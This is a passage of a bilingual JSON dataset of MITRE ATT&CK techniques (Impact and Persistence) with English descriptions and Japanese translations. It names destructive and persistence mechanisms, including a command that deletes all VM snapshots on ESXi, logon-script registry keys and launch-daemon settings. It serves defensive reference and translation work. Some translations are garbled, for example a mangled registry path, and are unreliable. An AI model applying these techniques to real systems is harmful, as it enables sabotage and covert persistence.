Wipe](https://attack.mitre.org/techniques/T1561)を活用してバックアップ・ファームウェア・イメージを削除し、ファイル・システムを再フォーマットし、次に[System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529)を活用してデバイスをリロードする可能性があります。この行為は、ネットワーク・デバイスを完全に操作不能にし、リカバリ作業を阻害する。\n\nESXi サーバでは、敵対者は、仮想マシンのスナップショットを削除または暗号化して、[Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486)をサポートし、バックアップとして活用できないようにすることがある（例えば、` vim-cmd vmsvc/snapshot.removeall`によって）。\n\nまた、ネットワークに接続された「オンライン」バックアップ（ネットワークストレージメディア経由であれ、クラウドサービスに同期するフォルダ経由であれ）を削除することもある（引用：ZDNet Ransomware Backups 2020）。 クラウド環境では、バージョン管理やバックアップポリシーを無効にし、スナップショット、データベースバックアップ、マシンイメージ、災害復旧シナリオで使用されるように設計されたオブジェクトの以前のバージョンを削除することもある（引用：Dark Reading Code Spaces Cyber Attack）（引用：Rhino Security Labs AWS S3 Ransomware）。",
                "subtechniques": []
            },
            {
                "id": "T1529",
                "name_eng": "System Shutdown/Reboot",
                "name_jp": "システムのシャットダウン/再起動",
                "description_eng": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A) They may also include shutdown/reboot of a virtual machine via hypervisor / cloud consoles or command line tools.\n\nShutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.\n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)",
                "description_jp": "攻撃者は、システムへのアクセスを妨害したり、システムの破壊を助けるために、システムをシャットダウン/リブートすることがある。オペレーティングシステムには、マシンまたはネットワークデバイスのシャットダウン/再起動を開始するコマンドが含まれている場合があります。場合によっては、これらのコマンドは[Network Device CLI](https://attack.mitre.org/techniques/T1059/008)(たとえば<code>reload</code>)を介してリモートコンピュータまたはネットワークデバイスのシャットダウン/再起動を開始するために使用されることもあります。(引用: Microsoft Shutdown Oct 2017)(引用: alert_TA18_106A) また、ハイパーバイザー/クラウドコンソールまたはコマンドラインツールを介した仮想マシンのシャットダウン/再起動も含まれることがあります。\n\nシステムのシャットダウンや再起動は、正当なユーザーのコンピュータリソースへのアクセスを妨害する可能性があるほか、インシデント対応や復旧の妨げにもなる。\n\n攻撃者は、システムの可用性に対する意図した影響を早めるために、[Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002)や[Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)などの他の方法でシステムに影響を与えた後に、システムのシャットダウン/再起動を試みることがあります(引用: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)",
                "subtechniques": []
            }
        ]
    },
    {
        "id": "TA0003",
        "name_eng": "Persistence",
        "name_jp": "永続性",
        "description_eng": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code.",
        "description_jp": "敵は足場を固めようとしている。\n\n永続性とは、再起動、認証情報の変更、およびアクセスを遮断する可能性のあるその他の中断を越えて、敵対者がシステムへのアクセスを維持するために使用する技術で構成される。永続性のために使用されるテクニックには、正当なコードを置き換えたり、乗っ取ったり、スタートアップコードを追加するなど、システムの足場を維持するためのあらゆるアクセス、アクション、設定の変更が含まれます。",
        "techniques": [
            {
                "id": "T1037",
                "name_eng": "Boot or Logon Initialization Scripts",
                "name_jp": "ブートまたはログオン初期化スクリプト",
                "description_eng": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "description_jp": "攻撃者は、ブートやログオンの初期化時に自動的に実行されるスクリプトを使用して、永続性を確立する可能性があります（引用：Mandiant APT29 Eye Spy Email 11月22日）（引用：Anomali Rocke 2019年3月）初期化スクリプトは、管理機能を実行するために使用することができ、多くの場合、他のプログラムを実行したり、内部のログサーバーに情報を送信したりすることがあります。これらのスクリプトは、オペレーティング システムや、ローカルまたはリモートで適用されるかどうかによって異なります。  \n\n攻撃者は、これらのスクリプトを使用して、1つのシステム上で永続性を維持することがある。ログオンスクリプトのアクセス構成によっては、ローカル認証情報または管理者アカウントのいずれかが必要となる場合がある。\n\nまた、ブートスクリプトやログオン初期化スクリプトの中には、より高い特権で実行されるものがあるため、敵対者は特権をエスカレートできる可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1037.004",
                        "name_eng": "RC Scripts",
                        "name_jp": "RCスクリプト",
                        "description_eng": "Adversaries may establish persistence by modifying RC scripts, which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.\n\nAdversaries may establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence.\n\nAdversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as ESXi hypervisors, IoT, or embedded systems.(Citation: intezer-kaiji-malware) As ESXi servers store most system files in memory and therefore discard changes on shutdown, leveraging `/etc/rc.local.d/local.sh` is one of the few mechanisms for enabling persistence across reboots.(Citation: Juniper Networks ESXi Backdoor 2022)\n\nSeveral Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004).(Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)",
                        "description_jp": "攻撃者は、Unixライクなシステムのスタートアップ時に実行されるRCスクリプトを修正することで、永続性を確立することができる。これらのファイルにより、システム管理者はスタートアップ時に異なるランレベル用のカスタムサービスをマッピングして起動することができる。RCスクリプトを変更するには、root権限が必要である。\n\n攻撃者は、悪意のあるバイナリパスやシェルコマンドを<code>rc.local</code>、<code>rc.common</code>、およびUnixライクなディストリビューションに固有のその他のRCスクリプトに追加することで、永続性を確立する可能性があります。(引用: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) 再起動時に、システムはスクリプトの内容をrootとして実行し、永続性をもたらします。\n\nRCスクリプトを悪用する攻撃者は、ESXiハイパーバイザー、IoT、組み込みシステムなど、デフォルトでrootユーザーを使用する軽量のUnix系ディストリビューションで特に効果的です。(引用：intezer-kaiji-malware) ESXiサーバーはほとんどのシステムファイルをメモリに保存するため、シャットダウン時に変更を破棄します。\n\nいくつかのUnixライクなシステムはSystemdに移行し、RCスクリプトの使用を非推奨とした。これは現在、macOSでは非推奨のメカニズムであり、[Launchd](https://attack.mitre.org/techniques/T1053/004)を採用しています。(引用: Apple Developer Doco Archive Launchd)(Citation: Startup Items) このテクニックは、RCスクリプトをまだ実行しているMac OS X Panther v10.3以前のバージョンでも使用できます。(引用: Methods of Mac Malware Persistence) 後方互換性を維持するために、Ubuntuなどの一部のシステムでは、RCスクリプトが正しいファイルパーミッションで存在する場合、RCスクリプトを実行します。(引用: Ubuntu Manpage systemd rc)"
                    },
                    {
                        "id": "T1037.001",
                        "name_eng": "Logon Script (Windows)",
                        "name_jp": "ログオン・スクリプト（Windows）",
                        "description_eng": "Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the <code>HKCU\\Environment\\UserInitMprLogonScript</code> Registry key.(Citation: Hexacorn Logon Scripts)\n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",
                        "description_jp": "攻撃者は、ログオン初期化時に自動的に実行されるWindowsログオンスクリプトを使用して、永続性を確立する可能性がある。Windowsでは、特定のユーザーまたはユーザーグループがシステムにログインするたびにログオンスクリプトを実行することができます（引用：TechNet Logon Scripts）。これは、スクリプトへのパスを<code>HKCUUentEnvormentUserInitMprLogonScript</code>レジストリキーに追加することで実行されます（引用：Hexacorn Logon Scripts）。\n\n攻撃者はこれらのスクリプトを使用して、1つのシステム上で永続性を維持する可能性がある。ログオンスクリプトのアクセス構成によっては、ローカル認証情報または管理者アカウントが必要になる場合があります。"
                    },
                    {
                        "id": "T1037.003",
                        "name_eng": "Network Logon Script",
                        "name_jp": "ネットワークログオンスクリプト",
                        "description_eng": "Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.(Citation: Petri Logon Script AD) These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  \n \nAdversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",
                        "description_jp": "攻撃者は、ログオン初期化時に自動的に実行されるネットワークログオンスクリプトを使用して、永続性を確立する可能性がある。ネットワークログオンスクリプトは、Active Directoryまたはグループポリシーオブジェクトを使用して割り当てることができます（引用：Petri Logon Script AD）。これらのログオンスクリプトは、割り当てられたユーザーの権限で実行されます。ネットワーク内のシステムによっては、これらのスクリプトの1つを初期化すると、複数のシステム、またはすべてのシステムに適用される可能性がある。  \n \n攻撃者は、これらのスクリプトを使用して、ネットワーク上の永続性を維持する可能性がある。ログオンスクリプトのアクセス構成によっては、ローカル認証情報または管理者アカウ ントが必要になる場合があります。"
                    },
                    {
                        "id": "T1037.005",
                        "name_eng": "Startup Items",
                        "name_jp": "スタートアップ・アイテム",
                        "description_eng": "Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.(Citation: Startup Items)\n\nThis is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), and thus the appropriate folder, <code>/Library/StartupItems</code> isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. \n\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.(Citation: Methods of Mac Malware Persistence) Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.",
                        "description_jp": "攻撃者は、ブート初期化時に自動的に実行されるスタートアップ項目を使用して、永続性を確立する可能性がある。スタートアップアイテムは、ブートプロセスの最終段階で実行され、シェルスクリプトやその他の実行可能ファイルを、システムがすべてのスタートアップアイテムの実行順序を決定するために使用する設定情報とともに含んでいる(引用：スタートアップアイテム)。\n\nこれは技術的に非推奨の技術であり（[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) に取って代わられた）、したがって適切なフォルダ <code>/Library/StartupItems</code> がデフォルトでシステムに存在することは保証されていませんが、macOS Sierra ではデフォルトで存在するようです。スタートアップアイテムは、実行ファイルと設定プロパティリスト（plist）である<code>StartupParameters.plist</code>が最上位ディレクトリに存在するディレクトリです。\n\n敵対者は、StartupItemsディレクトリ内に適切なフォルダ/ファイルを作成し、独自の永続化メカニズムを登録することができる（引用：Methods of Mac Malware Persistence）。さらに、StartupItemsはmacOSの起動フェーズで実行されるため、昇格したルートユーザーとして実行される。"
                    },
                    {
                        "id": "T1037.002",
                        "name_eng": "Login Hook",
                        "name_jp": "ログインフック",
                        "description_eng": "Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the <code>/Library/Preferences/com.apple.loginwindow.plist</code> file and can be modified using the <code>defaults</code> command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.(Citation: Login Scripts Apple Dev)(Citation: LoginWindowScripts Apple Dev) \n\nAdversaries can add or insert a path to a malicious script in the <code>com.apple.loginwindow.plist</code> file, using the <code>LoginHook</code> or <code>LogoutHook</code> key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.(Citation: S1 macOs Persistence)(Citation: Wardle Persistence Chapter)\n\n**Note:** Login hooks were deprecated in 10.11 version of macOS in favor of [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001)",
                        "description_jp": "攻撃者は、ユーザーログオン時に実行される永続性を確立するために、ログインフックを使用する可能性がある。ログインフックは、ユーザーログオン時にroot権限で実行される特定のスクリプトを指すplistファイルです。plistファイルは<code>/Library/Preferences/com.apple.loginwindow.plist<//code>ファイルにあり、<code>defaults<//code>コマンドラインユーティリティを使って変更できます。この動作は、ユーザーのログアウト時にスクリプトを実行できるログアウトフックでも同じです。すべてのフックには、フックを変更または作成するための管理者権限が必要です。(引用: Login Scripts Apple Dev)(Citation: LoginWindowScripts Apple Dev)\n\n攻撃者は、<code>LoginHook</code>または<code>LogoutHook</code>のキーと値のペアを使用して、悪意のあるスクリプトへのパスを<code>com.apple.loginwindow.plist</code>ファイルに追加または挿入できます。悪意のあるスクリプトは、次のユーザーログイン時に実行されます。ログインフックがすでに存在する場合、敵対者は既存のログインフックにコマンドを追加することができます。ログインフックとログアウトフックは、システム上に一度に1つしか存在できない(引用：S1 macOs Persistence)(引用：Wardle Persistence Chapter)\n\n**注: **ログインフックは、macOSの10.11バージョンで非推奨となり、[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) と [Launch Agent](https://attack.mitre.org/techniques/T1543/001) が採用されました。"
                    }
                ]
            },
            {
                "id": "T1543",
                "name_eng": "Create or Modify System Process",
                "name_jp": "システムプロセスの作成または変更",
                "description_eng": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.(Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.(Citation: OSX Malware Detection)",
                "description_jp": "攻撃者は、システムレベルのプロセスを作成または変更し、永続化の一環として悪意のあるペイロードを繰り返し実行する可能性があります。オペレーティングシステムが起動すると、バックグラウンドのシステム機能を実行するプロセスを開始することができる。引用：TechNet Services） macOSでは、[Launch Daemon](https://attack.mitre.org/techniques/T1543/004)および[Launch Agent](https://attack.mitre.org/techniques/T1543/001)として知られるlaunchdプロセスが実行され、システムの初期化を完了し、ユーザー固有のパラメータをロードします。\n\n攻撃者は、永続性を確立するために、起動時または繰り返し実行されるように設定できる新しいサービス、デーモン、またはエージェントをインストールすることができる。同様に、敵対者は既存のサービス、デーモン、またはエージェントを変更して、同じ効果を得ることもできる。  \n\nサービス、デーモン、またはエージェントは、管理者権限で作成されるが、root/SYSTEM 権限で実行されるかもしれない。敵はこの機能を利用して、特権をエスカレートさせるためにシステムプロセスを作成または変更する可能性があります。 引用：OSXマルウェア検出",
                "subtechniques": [
                    {
                        "id": "T1543.004",
                        "name_eng": "Launch Daemon",
                        "name_jp": "デーモン起動",
                        "description_eng": "Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists)\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019)",
                        "description_jp": "攻撃者は、永続化の一環として悪意のあるペイロードを実行するためにLaunch Daemonを作成または変更する可能性があります。Launch Daemonは、macOSで使用されるサービス管理フレームワークであるLaunchdとやり取りするために使用されるplistファイルです。Launch Daemonのインストールには昇格権限が必要で、ログイン前にシステム上のすべてのユーザーに対して実行され、ユーザーの操作を必要とせずにバックグラウンドで実行されます。macOS の初期化起動中に、launchd プロセスは、<code>/System/Library/LaunchDaemons/</code> および <code>/Library/LaunchDaemons/</code> にある plist ファイルから、起動オンデマンドのシステムレベルデーモンのパラメータをロードします。Launch Daemons の必須パラメータには、タスクを識別するための <code>Label</code> 、実行ファイルへのパスを提供する <code>Program</code> 、タスクが実行されるタイミングを指定する <code>RunAtLoad</code> が含まれます。Launchデーモンは、共有リソースへのアクセス、ソフトウェアのアップデート、自動化タスクの実行によく使用されます。 (引用: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Plistsのキーワード)\n\n攻撃者は、<code>RunAtLoad</code> パラメータを <code>true</code> に設定し、<code>Program</code> パラメータを悪意のある実行可能パスに設定することで、起動時に実行するように設定された Launch Daemon をインストールすることができます。デーモン名は、関連するオペレーティングシステムまたは良性のソフトウェアからの名前を使用して偽装することができます（すなわち、[Masquerading](https://attack.mitre.org/techniques/T1036)）。Launch Daemonが実行されると、プログラムは管理者権限を継承します。(引用：WireLurker)(引用：OSX Malware Detection)\n\nさらに、システム設定の変更（サードパーティ製のパッケージ管理ソフトウェアのインストールなど）によって、<code>usr/local/bin</code>などのフォルダがグローバルに書き込み可能になることがあります。そのため、設定の不備によって、現在のLaunch Daemonのplistファイルによって参照される実行可能ファイルを敵対者が変更できる可能性があります。 引用：LaunchDaemonハイジャック）（引用：sentinelone macos persist 2019年6月号"
                    },
                    {
                        "id": "T1543.005",
                        "name_eng": "Container Service",
                        "name_jp": "コンテナサービス",
                        "description_eng": "Adversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.\n\nFor example, by using the `docker run` or `podman run` command with the `restart=always` directive, a container can be configured to persistently restart on the host.(Citation: AquaSec TeamTNT 2023) A user with access to the (rootful) docker command may also be able to escalate their privileges on the host.(Citation: GTFOBins Docker)\n\nIn Kubernetes environments, DaemonSets allow an adversary to persistently [Deploy Container](https://attack.mitre.org/techniques/T1610)s on all nodes, including ones added later to the cluster.(Citation: Aquasec Kubernetes Attack 2023)(Citation: Kubernetes DaemonSet) Pods can also be deployed to specific nodes using the `nodeSelector` or `nodeName` fields in the pod spec.(Citation: Kubernetes Assigning Pods to Nodes)(Citation: AppSecco Kubernetes Namespace Breakout 2020)\n\nNote that containers can also be configured to run as [Systemd Service](https://attack.mitre.org/techniques/T1543/002)s.(Citation: Podman Systemd)(Citation: Docker Systemd)",
                        "description_jp": "攻撃者は、個々のホスト上でデーモン、エージェント、またはサービスとして実行されるコンテナまたはコンテナ・クラスタ管理ツールを作成または変更する可能性があります。これには、DockerやPodmanなどの個々のコンテナを作成および管理するソフトウェアや、kubeletなどのコンテナ・クラスタ・ノード・レベルのエージェントが含まれます。これらのサービスを変更することで、敵はホスト上で永続性を実現したり、特権をエスカレートしたりできる可能性があります。\n\n例えば、`docker run`コマンドや`podman run`コマンドに`restart=always`ディレクティブを指定することで、コンテナをホスト上で持続的に再起動するように設定することができる。(引用：AquaSec TeamTNT 2023) また、(rootfulな)dockerコマンドにアクセスできるユーザーであれば、ホスト上で特権をエスカレートできる可能性がある。\n\nKubernetes環境では、DaemonSetによって、敵対者は、クラスタに後から追加されたものも含め、すべてのノード上で永続的に[Deploy Container](https://attack.mitre.org/techniques/T1610)することができます。(引用: Aquasec Kubernetes Attack 2023)(引用: Kubernetes DaemonSet) Podは、Pod specの`nodeSelector`または`nodeName`フィールドを使用して特定のノードにデプロイすることもできます(引用: Kubernetes Assigning Pods to Nodes)(引用: AppSecco Kubernetes Namespace Breakout 2020)\n\nコンテナは[Systemd Service](https://attack.mitre.org/techniques/T1543/002)として実行するように設定することもできることに注意してください。(引用: Podman Systemd)(引用: Docker Systemd)"
                    },
                    {
                        "id": "T1543.001",
                        "name_eng": "Launch Agent",
                        "name_jp": "ローンチエージェント",
                        "description_eng": "Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.(Citation: AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware) Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time.(Citation: OSX.Dok Malware) Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.\n\n Launch Agents can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001) command.\n \nAdversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>.(Citation: Sofacy Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.(Citation: OSX Malware Detection)(Citation: OceanLotus for OS X)",
                        "description_jp": "攻撃者は、永続性の一部として悪意のあるペイロードを繰り返し実行するために、ローンチエージェントを作成または変更する可能性があります。ユーザーがログインすると、ユーザーごとの launchd プロセスが開始され、<code>/System/Library/LaunchAgents</code>、<code>/Library/LaunchAgents</code>、<code>~/Library/LaunchAgents</code> にあるプロパティリスト (.plist) ファイルから、各 launch-on-demand ユーザーエージェントのパラメータがロードされます。(引用：AppleDocs Launch Agent Daemons)(引用：OSX Keydnap malware)(引用：Antiquated Mac Malware) プロパティリストファイルは、<code>Label</code>、<code>ProgramArguments</code>、<code>RunAtLoad</code>キーを使用して、Launch Agentの名前、実行可能な場所、および実行時間を特定します。(引用：OSX.Dok Malware) Launch Agentは、プログラムのアップデートを実行したり、ログイン時にユーザーが指定したプログラムを起動したり、その他の開発者タスクを実行したりするためにインストールされることがよくあります。\n\n 起動エージェントは、[Launchctl](https://attack.mitre.org/techniques/T1569/001)コマンドを使用して実行することもできます。\n \n攻撃者は、<code>RunAtLoad</code>キーまたは<code>KeepAlive</code>キーを<code>true</code>に設定した.plistファイルを適切なフォルダに配置することで、ログイン時に実行される新しいLaunch Agentをインストールすることができます（引用：Sofacy Komplex Trojan）（引用：Methods of Mac Malware Persistence）Launch Agentの名前は、関連するオペレーティングシステムまたは良性のソフトウェアの名前を使用して偽装することができます。起動エージェントは、ユーザーレベルの権限で作成され、ユーザーレベルの権限で実行されます。 引用：OSXマルウェア検出）（引用：OceanLotus for OS X"
                    },
                    {
                        "id": "T1543.002",
                        "name_eng": "Systemd Service",
                        "name_jp": "Systemdサービス",
                        "description_eng": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014) Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \n\nSystemd utilizes unit configuration files with the `.service` file extension to encode information about a service's process. By default, system level unit files are stored in the `/systemd/system` directory of the root owned directories (`/`). User level unit files are stored in the `/systemd/user` directories of the user owned directories (`$HOME`).(Citation: lambert systemd 2022) \n\nInside the `.service` unit files, the following directives are used to execute commands:(Citation: freedesktop systemd.service)  \n\n* `ExecStart`, `ExecStartPre`, and `ExecStartPost` directives execute when a service is started manually by `systemctl` or on system start if the service is set to automatically start.\n* `ExecReload` directive executes when a service restarts. \n* `ExecStop`, `ExecStopPre`, and `ExecStopPost` directives execute when a service is stopped.  \n\nAdversaries have created new service files, altered the commands a `.service` file’s directive executes, and modified the user directive a `.service` file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.(Citation: Anomali Rocke March 2019)(Citation: airwalk backdoor unix systems)(Citation: Rapid7 Service Persistence 22JUNE2016) \n\nThe `.service` file’s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions. \n\nSystemd services can be created via systemd generators, which support the dynamic generation of unit files. Systemd generators are small executables that run during boot or configuration reloads to dynamically create or modify systemd unit files by converting non-native configurations into services, symlinks, or drop-ins (i.e., [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037)).(Citation: Elastic Security Labs Linux Persistence 2024)(Citation: Pepe Berba Systemd 2022)",
                        "description_jp": "攻撃者は、永続化の一環として悪意のあるペイロードを繰り返し実行するために、systemdサービスを作成または変更する可能性があります。Systemdは、バックグラウンドのデーモンプロセス（サービスとも呼ばれる）やその他のシステムリソースを管理するために一般的に使用されるシステムおよびサービスマネージャです。(引用: Linux man-pages: systemd January 2014) Systemdは、多くのLinuxディストリビューションで、SysVinitやUpstartなどのレガシーなinitシステムに取って代わるデフォルトの初期化（init）システムです。  \n\nSystemd はサービスのプロセスに関する情報をエンコードするために `.service` ファイル拡張子を持つユニット設定ファイルを利用します。デフォルトでは、システムレベルのユニットファイルはルート所有ディレクトリ (`//`) の `/systemd/system` ディレクトリに格納されます。ユーザーレベルのユニットファイルは、ユーザー所有のディレクトリ (`$HOME`) の `/systemd/user` ディレクトリに格納される。(引用: lambert systemd 2022)\n\nユニットファイル `.service` 内では、以下のディレクティブがコマンド実行に使用される:(引用: freedesktop systemd.service)\n\n* ExecStart`、`ExecStartPre`、`ExecStartPost` ディレクティブは、サービスが `systemctl` によって手動で起動されたとき、またはサービスが自動的に起動するように設定されている場合はシステム起動時に実行されます。\n* ExecReload` ディレクティブはサービスが再起動したときに実行される。\n* ExecStop`, `ExecStopPre`, `ExecStopPost` ディレクティブはサービスが停止したときに実行される。  \n\n逆境者は新しいサービスファイルを作成したり、`.service` ファイルのディレクティブが実行するコマンドを変更したり、`.service` ファイルが実行するユーザディレクティブを変更したりして、特権を昇格させる可能性があります。攻撃者はまた、これらのディレクトリにシンボリックリンクを設置し、ファイルシステムのどこに存在するかに関係なく、systemd がこれらのペイロードを見つけられるようにする可能性があります。(引用: Anomali Rocke March 2019)(引用: airwalk backdoor unix systems)(引用: Rapid7 Service Persistence 22JUNE2016)\n\n.service`ファイルのUserディレクティブは、特定のユーザーとしてサービスを実行するために使用することができ、特定のユーザー/グループのパーミッションに基づいて特権の昇格を引き起こす可能性があります。\n\nSystemd サービスは、ユニットファイルの動的生成をサポートする systemd ジェネレータを使って作成できます。Systemd ジェネレータは、ブートや設定のリロード中に実行される小さな実行ファイルで、ネイティブでない設定をサービスやシンボリックリンク、ドロップイン（[Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037)など）に変換することで、systemd ユニットファイルを動的に作成または変更します。(引用: Elastic Security Labs Linux Persistence 2024)(Citation: Pepe Berba Systemd 2022)"
                    },
                    {
                        "id": "T1543.003",
                        "name_eng": "Windows Service",
                        "name_jp": "Windowsサービス",
                        "description_eng": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required 